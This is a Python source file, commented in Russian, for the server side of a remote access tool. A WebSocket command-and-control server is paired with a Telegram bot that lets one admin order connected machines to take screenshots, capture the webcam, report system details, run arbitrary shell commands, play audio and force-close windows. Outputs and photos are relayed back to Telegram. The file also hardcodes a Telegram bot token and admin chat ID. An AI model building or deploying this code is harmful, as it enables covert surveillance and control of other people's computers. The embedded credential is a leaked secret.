import asyncio
import json
import secrets
import subprocess
import sys
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, Optional

from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.session.aiohttp import AiohttpSession
from aiogram.filters import Command
from aiogram.types import (
    CallbackQuery,
    FSInputFile,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    KeyboardButton,
    Message,
    ReplyKeyboardMarkup,
)
from aiohttp_socks import ProxyConnector
import websockets
from websockets.asyncio.server import ServerConnection


HOST = "0.0.0.0"
PORT = 8765
SAVE_DIR = Path(".")
# Только для запросов бота к api.telegram.org; WebSocket (8765) прокси не использует.


def get_default_route_ip() -> str:
    """
    Пытается извлечь IP next-hop (поле `via`) из вывода `ip route show`.
    Если команда недоступна/не сработала - возвращает `127.0.0.1`.
    """
    try:
        result = subprocess.run(
            ["ip", "route", "show", "default"],
            capture_output=True,
            text=True,
            check=False,
        )
        if result.returncode != 0 or not result.stdout.strip():
            result = subprocess.run(
                ["ip", "route", "show"],
                capture_output=True,
                text=True,
                check=False,
            )

        for line in result.stdout.splitlines():
            line = line.strip()
            if not line.startswith("default"):
                continue

            parts = line.split()
            if "via" in parts:
                via_idx = parts.index("via")
                ip = parts[via_idx + 1] if via_idx + 1 < len(parts) else ""
                return ip or "127.0.0.1"

        return "127.0.0.1"
    except Exception as e:
        print(f"[!] Ошибка при получении маршрута: {e}")
        return "127.0.0.1"


TELEGRAM_SOCKS5_PROXY = f"socks5://{get_default_route_ip()}:10808"
TELEGRAM_TOKEN = "8652985183:AAHMEpMEEa8A2ppdf3Kl5TDQaMNnDQ-hbyw"
ADMIN_CHAT_ID = 5183449275

# ws -> friendly_client_id (например "mypc-a1b2c3d4")
clients: Dict[ServerConnection, str] = {}

# friendly_client_id -> ws (обратный индекс для быстрого поиска)
clients_by_id: Dict[str, ServerConnection] = {}
play_file_tokens: Dict[str, tuple[str, str]] = {}
bot: Optional[Bot] = None
dp = Dispatcher()
router = Router()
dp.include_router(router)


def now_ts() -> str:
    return datetime.now().strftime("%Y%m%d_%H%M%S_%f")


def list_clients() -> None:
    if not clients:
        print("[i] No clients connected.")
        return

    identified = list(clients_by_id.keys())
    pending = [cid for cid in clients.values() if cid not in clients_by_id]

    print(f"[i] Connected clients ({len(clients)}):")
    if identified:
        print("    Identified:")
        for cid in identified:
            print(f"      - {cid}")
    if pending:
        print("    Pending identification (temporary id):")
        for cid in pending:
            print(f"      - {cid}")


def resolve_targets(target: Optional[str]) -> Dict[ServerConnection, str]:
    """
    target=None или "all"  → все клиенты
    target="<id>"          → только конкретный клиент
    Возвращает {ws: client_id} для отправки.
    """
    if target is None or target == "all":
        return dict(clients)

    ws = clients_by_id.get(target)
    if ws is None:
        for conn, cid in clients.items():
            if cid == target:
                ws = conn
                break
    if ws is None:
        print(f"[!] Client not found: {target}")
        return {}
    return {ws: target}


async def send_command(
    action: str,
    target: Optional[str] = None,
    extra_data: Optional[Dict[str, Any]] = None,
) -> None:
    targets = resolve_targets(target)
    if not targets:
        return

    payload_dict: Dict[str, Any] = {"action": action}
    if extra_data:
        payload_dict.update(extra_data)
    payload = json.dumps(payload_dict)
    dead = []
    for ws, cid in targets.items():
        try:
            await ws.send(payload)
            print(f"[>] Sent '{action}' to {cid}")
        except Exception as exc:
            print(f"[!] Failed to send to {cid}: {exc}")
            dead.append(ws)

    for ws in dead:
        cid = clients.pop(ws, None)
        if cid:
            clients_by_id.pop(cid, None)


def build_client_choices() -> list[str]:
    choices: list[str] = []
    for cid in clients_by_id.keys():
        choices.append(cid)
    for cid in clients.values():
        if cid not in clients_by_id:
            choices.append(cid)
    return choices


def build_main_menu() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="Screenshot"), KeyboardButton(text="Webcam")],
            [KeyboardButton(text="System Info"), KeyboardButton(text="List Clients")],
            [KeyboardButton(text="Volume"), KeyboardButton(text="Audio Files")],
            [KeyboardButton(text="Minimize All"), KeyboardButton(text="Close All")],
        ],
        resize_keyboard=True,
    )


def build_targets_keyboard(action: str) -> InlineKeyboardMarkup:
    rows: list[list[InlineKeyboardButton]] = []
    for cid in build_client_choices():
        rows.append(
            [InlineKeyboardButton(text=cid, callback_data=f"act:{action}:{cid}")]
        )
    rows.append([InlineKeyboardButton(text="ALL", callback_data=f"act:{action}:all")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def build_volume_levels_keyboard(target_client: str) -> InlineKeyboardMarkup:
    levels = (0, 25, 50, 75, 100)
    row = [
        InlineKeyboardButton(
            text=f"{p}%",
            callback_data=f"act:set_vol:{target_client}:{p}",
        )
        for p in levels
    ]
    return InlineKeyboardMarkup(inline_keyboard=[row])


def truncate_label(text: str, max_len: int = 40) -> str:
    if len(text) <= max_len:
        return text
    return f"{text[: max_len - 1]}…"


def make_play_file_keyboard(client_id: str, files: list[str]) -> InlineKeyboardMarkup:
    rows: list[list[InlineKeyboardButton]] = []
    # Telegram callback_data limit is 64 bytes, so we store full filename server-side.
    for filename in files:
        token = secrets.token_urlsafe(8)
        while token in play_file_tokens:
            token = secrets.token_urlsafe(8)
        play_file_tokens[token] = (client_id, filename)
        rows.append(
            [
                InlineKeyboardButton(
                    text=truncate_label(filename),
                    callback_data=f"play_file:{token}",
                )
            ]
        )
    return InlineKeyboardMarkup(inline_keyboard=rows)


def is_admin(user_id: Optional[int]) -> bool:
    return user_id == ADMIN_CHAT_ID


@router.message(Command("start"))
async def on_start(message: Message) -> None:
    if not is_admin(message.from_user.id if message.from_user else None):
        return
    await message.answer("Main menu:", reply_markup=build_main_menu())


@router.message(F.text == "Screenshot")
async def on_screenshot_menu(message: Message) -> None:
    if not is_admin(message.from_user.id if message.from_user else None):
        return
    await message.answer(
        "Choose target for Screenshot:",
        reply_markup=build_targets_keyboard("screenshot"),
    )


@router.message(F.text == "Webcam")
async def on_webcam_menu(message: Message) -> None:
    if not is_admin(message.from_user.id if message.from_user else None):
        return
    await message.answer(
        "Choose target for Webcam:",
        reply_markup=build_targets_keyboard("webcam"),
    )


@router.message(F.text == "System Info")
async def on_sysinfo_menu(message: Message) -> None:
    if not is_admin(message.from_user.id if message.from_user else None):
        return
    await message.answer(
        "Choose target for System Info:",
        reply_markup=build_targets_keyboard("sys_info"),
    )


@router.message(F.text == "Volume")
async def on_volume_menu(message: Message) -> None:
    if not is_admin(message.from_user.id if message.from_user else None):
        return
    await message.answer(
        "Choose target for Volume:",
        reply_markup=build_targets_keyboard("vol_target"),
    )


@router.message(F.text == "Audio Files")
async def on_audio_files_menu(message: Message) -> None:
    if not is_admin(message.from_user.id if message.from_user else None):
        return
    await message.answer(
        "Choose target to request audio files:",
        reply_markup=build_targets_keyboard("request_audio"),
    )


@router.message(F.text == "Minimize All")
async def on_minimize_menu(message: Message) -> None:
    if not is_admin(message.from_user.id if message.from_user else None):
        return
    await message.answer(
        "Choose target for Minimize All:",
        reply_markup=build_targets_keyboard("minimize_all"),
    )


@router.message(F.text == "Close All")
async def on_close_menu(message: Message) -> None:
    if not is_admin(message.from_user.id if message.from_user else None):
        return
    await message.answer(
        "⚠️ Choose target for Close All (all windows will be forcibly closed):",
        reply_markup=build_targets_keyboard("close_all"),
    )


@router.message(F.text == "List Clients")
async def on_list_clients(message: Message) -> None:
    if not is_admin(message.from_user.id if message.from_user else None):
        return

    identified = list(clients_by_id.keys())
    pending = [cid for cid in clients.values() if cid not in clients_by_id]
    if not identified and not pending:
        await message.answer("No clients connected.")
        return

    lines = [f"Connected clients: {len(clients)}"]
    if identified:
        lines.append("Identified:")
        lines.extend(f"- {cid}" for cid in identified)
    if pending:
        lines.append("Pending:")
        lines.extend(f"- {cid}" for cid in pending)
    await message.answer("\n".join(lines))


@router.message(Command("play"))
async def on_play_command(message: Message) -> None:
    if not is_admin(message.from_user.id if message.from_user else None):
        return

    text = (message.text or "").strip()
    parts = text.split(maxsplit=2)
    if len(parts) < 3:
        await message.answer("Usage: /play <client_id|all> <absolute_path_on_client>")
        return

    _, target, filepath = parts
    if not filepath.strip():
        await message.answer("Usage: /play <client_id|all> <absolute_path_on_client>")
        return

    await send_command("play_audio", target, extra_data={"file_path": filepath.strip()})
    await message.answer(f"Sent `play_audio` to `{target}` with path: `{filepath.strip()}`")


@router.message(Command("sh"))
async def on_shell_command(message: Message) -> None:
    if not is_admin(message.from_user.id if message.from_user else None):
        return

    text = (message.text or "").strip()
    # /sh <client_id> <команда>
    parts = text.split(maxsplit=2)
    if len(parts) < 3:
        await message.answer("Usage: /sh &lt;client_id&gt; &lt;command&gt;", parse_mode="HTML")
        return

    _, target, cmd = parts
    if not cmd.strip():
        await message.answer("Usage: /sh &lt;client_id&gt; &lt;command&gt;", parse_mode="HTML")
        return

    ws = clients_by_id.get(target)
    if ws is None:
        await message.answer(f"Client not found: <code>{target}</code>", parse_mode="HTML")
        return

    await send_command("shell", target, extra_data={"cmd": cmd.strip()})
    await message.answer(
        f"Shell command sent to <code>{target}</code>:\n<code>{cmd.strip()}</code>",
        parse_mode="HTML",
    )


@router.callback_query(F.data.startswith("act:"))
async def on_action_callback(callback: CallbackQuery) -> None:
    if not is_admin(callback.from_user.id if callback.from_user else None):
        await callback.answer()
        return

    data = callback.data or ""

    if data.startswith("act:set_vol:"):
        mid = data[len("act:set_vol:"):]
        try:
            target, level_str = mid.rsplit(":", 1)
            level = int(level_str)
        except (ValueError, IndexError):
            await callback.answer("Invalid volume callback", show_alert=True)
            return
        await send_command("set_volume", target, extra_data={"level": level})
        await callback.answer("Volume command sent")
        if callback.message:
            await callback.message.answer(f"Sent set_volume {level}% to `{target}`")
        return

    try:
        _, action, target = data.split(":", 2)
    except ValueError:
        await callback.answer("Bad callback data", show_alert=True)
        return

    if action == "vol_target":
        if callback.message:
            await callback.message.edit_text(
                f"Choose volume level for `{target}`:",
                reply_markup=build_volume_levels_keyboard(target),
            )
        await callback.answer()
        return

    if action == "request_audio":
        await send_command("list_audio", target)
        await callback.answer("Audio list requested")
        if callback.message:
            await callback.message.answer(f"Requested audio list from {target}")
        return

    await send_command(action, target)
    await callback.answer("Command sent")
    if callback.message:
        await callback.message.answer(f"Sent `{action}` to `{target}`")


@router.callback_query(F.data.startswith("play_file:"))
async def on_play_file_callback(callback: CallbackQuery) -> None:
    if not is_admin(callback.from_user.id if callback.from_user else None):
        await callback.answer()
        return

    data = callback.data or ""
    token = data[len("play_file:"):]
    resolved = play_file_tokens.get(token)
    if not resolved:
        await callback.answer("This audio button is expired", show_alert=True)
        return

    target, filename = resolved
    await send_command("play_audio", target, extra_data={"file_path": filename})
    await callback.answer("Playback command sent")
    if callback.message:
        await callback.message.answer(f"Sent play_audio to {target}: {filename}")


def parse_command(raw: str):
    """
    Разбирает строку команды. Примеры:
      screenshot                  → ("screenshot", None)
      screenshot mypc-a1b2c3d4    → ("screenshot", "mypc-a1b2c3d4")
      webcam all                  → ("webcam", None)
      info                        → ("info", None)
    Возвращает (action, target) или None если не распознано.
    """
    parts = raw.strip().split(maxsplit=1)
    if not parts:
        return None

    cmd = parts[0].lower()
    target = parts[1].strip() if len(parts) > 1 else None

    known = {"screenshot", "webcam", "play", "info", "list", "quit", "exit", "help"}
    if cmd not in known:
        return None

    return cmd, target


async def handle_client(ws: ServerConnection) -> None:
    # IP:port как временный id до получения настоящего client_id
    conn_id = f"{ws.remote_address[0]}:{ws.remote_address[1]}" if ws.remote_address else "unknown"
    clients[ws] = conn_id
    print(f"[+] Client connected: {conn_id}")

    try:
        while True:
            message = await ws.recv()

            if isinstance(message, bytes):
                print(f"[!] Unexpected binary from {clients[ws]}, ignoring")
                continue

            try:
                meta = json.loads(message)
            except json.JSONDecodeError:
                print(f"[!] Invalid JSON from {clients[ws]}, ignoring")
                continue

            msg_type = meta.get("type")

            # Обновляем client_id как только клиент представился
            reported_id = meta.get("client_id")
            if isinstance(reported_id, str) and reported_id:
                old_id = clients.get(ws)
                if old_id != reported_id:
                    if old_id and old_id in clients_by_id:
                        clients_by_id.pop(old_id)
                    clients[ws] = reported_id
                    clients_by_id[reported_id] = ws

            current_id = clients[ws]

            if msg_type == "sys_info":
                hostname   = meta.get("hostname")
                os_name    = meta.get("os")
                os_release = meta.get("os_release")
                os_version = meta.get("os_version")
                arch       = meta.get("architecture")
                processor  = meta.get("processor")
                ram_bytes  = meta.get("ram_total_bytes")

                print(f"[+] System info from {current_id}:")
                print(f"    Hostname:      {hostname}")
                print(f"    OS:            {os_name} {os_release}")
                print(f"    Version:       {os_version}")
                print(f"    Architecture:  {arch}")
                print(f"    Processor:     {processor}")
                if isinstance(ram_bytes, int):
                    print(f"    RAM:           {ram_bytes / (1024**3):.2f} GiB")
                else:
                    print(f"    RAM:           {ram_bytes}")
                if bot:
                    lines = [
                        f"System info from {current_id}:",
                        f"Hostname: {hostname}",
                        f"OS: {os_name} {os_release}",
                        f"Version: {os_version}",
                        f"Architecture: {arch}",
                        f"Processor: {processor}",
                    ]
                    if isinstance(ram_bytes, int):
                        lines.append(f"RAM: {ram_bytes / (1024**3):.2f} GiB")
                    else:
                        lines.append(f"RAM: {ram_bytes}")
                    try:
                        await bot.send_message(ADMIN_CHAT_ID, "\n".join(lines))
                    except Exception as exc:
                        print(f"[!] Failed to send sys_info to Telegram: {exc}")
                continue

            if msg_type == "info":
                info_msg = meta.get("message")
                print(f"[+] Info from {current_id}: {info_msg}")
                if bot and isinstance(info_msg, str) and info_msg:
                    try:
                        await bot.send_message(
                            ADMIN_CHAT_ID, f"{current_id}: {info_msg}"
                        )
                    except Exception as exc:
                        print(f"[!] Failed to send info to Telegram: {exc}")
                continue

            if msg_type == "audio_list":
                files = meta.get("files")
                if not isinstance(files, list):
                    print(f"[!] Invalid audio_list payload from {current_id}")
                    continue
                audio_files = [name for name in files if isinstance(name, str) and name]
                print(f"[+] Audio list from {current_id}: {len(audio_files)} files")
                if bot:
                    try:
                        if audio_files:
                            await bot.send_message(
                                ADMIN_CHAT_ID,
                                f"Audio files on {current_id} (choose one to play):",
                                reply_markup=make_play_file_keyboard(current_id, audio_files),
                            )
                        else:
                            await bot.send_message(
                                ADMIN_CHAT_ID, f"Audio files on {current_id}: none found."
                            )
                    except Exception as exc:
                        print(f"[!] Failed to send audio list to Telegram: {exc}")
                continue

            if msg_type == "shell_result":
                output = meta.get("output", "")
                print(f"[+] Shell result from {current_id}: {output[:120]!r}{'...' if len(output) > 120 else ''}")
                if bot and isinstance(output, str):
                    MAX_OUTPUT = 3800
                    display = output
                    truncated = False
                    if len(display) > MAX_OUTPUT:
                        display = display[:MAX_OUTPUT]
                        truncated = True
                    # Экранируем символы HTML внутри вывода
                    display = display.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                    text = f"<b>Shell result from {current_id}:</b>\n<code>{display}</code>"
                    if truncated:
                        text += "\n<b>[TRUNCATED]</b>"
                    try:
                        await bot.send_message(ADMIN_CHAT_ID, text, parse_mode="HTML")
                    except Exception as exc:
                        print(f"[!] Failed to send shell result to Telegram: {exc}")
                continue

            if msg_type not in {"screenshot", "webcam"}:
                print(f"[i] Unknown message type from {current_id}: {msg_type}")
                continue

            size = meta.get("size")
            if not isinstance(size, int) or size <= 0:
                print(f"[!] Invalid size from {current_id}: {size}")
                continue

            try:
                binary_payload = await asyncio.wait_for(ws.recv(), timeout=30)
            except asyncio.TimeoutError:
                print(f"[!] Timeout waiting for binary payload from {current_id}")
                continue

            if not isinstance(binary_payload, bytes):
                print(f"[!] Expected binary from {current_id}, got text")
                continue

            if len(binary_payload) != size:
                print(f"[!] Size mismatch from {current_id}: expected {size}, got {len(binary_payload)}")

            safe = current_id.replace(":", "_").replace("/", "_").replace("\\", "_")
            filename = SAVE_DIR / f"{msg_type}_{safe}_{now_ts()}.png"
            filename.write_bytes(binary_payload)
            print(f"[+] Saved {msg_type} from {current_id}: {filename}")
            if bot:
                caption = f"{msg_type} from {current_id}"
                try:
                    await bot.send_photo(
                        ADMIN_CHAT_ID,
                        photo=FSInputFile(str(filename)),
                        caption=caption,
                    )
                except Exception as exc:
                    print(f"[!] Failed to send file to Telegram: {exc}")

    except websockets.ConnectionClosed:
        print(f"[-] Client disconnected: {clients.get(ws, conn_id)}")
    except Exception as exc:
        print(f"[!] Error with {clients.get(ws, conn_id)}: {exc}")
    finally:
        cid = clients.pop(ws, None)
        if cid:
            clients_by_id.pop(cid, None)


async def run_ws_server() -> None:
    async with websockets.serve(handle_client, HOST, PORT, max_size=None):
        print(f"[+] Server listening on ws://{HOST}:{PORT}")
        await asyncio.Future()


async def run_telegram_bot() -> None:
    if bot is None:
        raise RuntimeError("Telegram bot is not initialized")
    await dp.start_polling(bot)


async def terminal_input_handler() -> None:
    """
    Асинхронный обработчик команд из терминала.
    Чтение из stdin выносится в executor, чтобы не блокировать event loop.
    """
    loop = asyncio.get_event_loop()
    print("[i] Terminal commands: list, exit, quit")

    while True:
        line = await loop.run_in_executor(None, sys.stdin.readline)
        if not line:
            await asyncio.sleep(0.1)
            continue

        cmd = line.strip().lower()
        if not cmd:
            continue

        if cmd in {"exit", "quit"}:
            print("[i] Shutdown requested from terminal, cancelling tasks...")
            current = asyncio.current_task()
            for task in asyncio.all_tasks():
                if task is not current:
                    task.cancel()
            return

        if cmd == "list":
            list_clients()
            continue

        print("[i] Unknown command. Available: list, exit, quit")


async def main() -> None:
    global bot
    session = AiohttpSession(proxy=TELEGRAM_SOCKS5_PROXY)
    print(
        f"[i] Telegram Bot API: {TELEGRAM_SOCKS5_PROXY} "
        f"(connector={ProxyConnector.__name__})"
    )
    bot = Bot(token=TELEGRAM_TOKEN, session=session)
    try:
        await asyncio.gather(
            run_ws_server(),
            run_telegram_bot(),
            terminal_input_handler(),
        )
    except asyncio.CancelledError:
        pass


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[i] Server stopped by user.")
